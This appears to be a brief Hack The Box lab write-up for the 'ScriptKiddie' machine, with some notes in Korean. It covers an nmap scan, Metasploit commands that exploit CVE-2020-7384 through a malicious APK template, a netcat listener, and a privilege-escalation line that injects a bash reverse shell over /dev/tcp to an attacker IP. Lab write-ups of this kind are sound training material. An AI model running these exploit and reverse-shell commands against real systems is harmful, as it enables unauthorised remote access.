## Machine: ScriptKiddie
- Date: 2021.05.02
- Author: jak010

### Setup
- ExportIP: 10.10.10.226


### Nmap Scan
```text
# Nmap 7.91 scan initiated Sun May  2 15:52:33 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  2 15:52:51 2021 -- 1 IP address (1 host up) scanned in 17.95 seconds
```

### Interesting
- 사용자가 입력한 값을 결과로 보여주고 있음
- `Payloads`를 입력받는 곳에서 플랫폼을 선택할 수 있음
	- windows
	- linux
	- android

### Malicious Payload
- `exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`
	- Refer to
		- `https://nvd.nist.gov/vuln/detail/CVE-2020-7384`
		- `https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/`

### Exploit && Ganing Shell
- Payload Generate
    ```sh
    msf6 > search apk_template
    msf6 > use 0
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.58
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
    [+] msf.apk stored at /Users/jak/.msf4/local/msf.apk
    ```
- Reverse Shell
	- OS X
        ```sh
        $ nc -nvl 4444
        ``` 
        
### Priviliege Escalate
- Payload
    ```sh 
    $ echo “ ;/usr/bin/bash -c ‘/usr/bin/bash -i >& /dev/tcp/10.10.14.58/9001 0>&1’ #” >> hackers
    ```


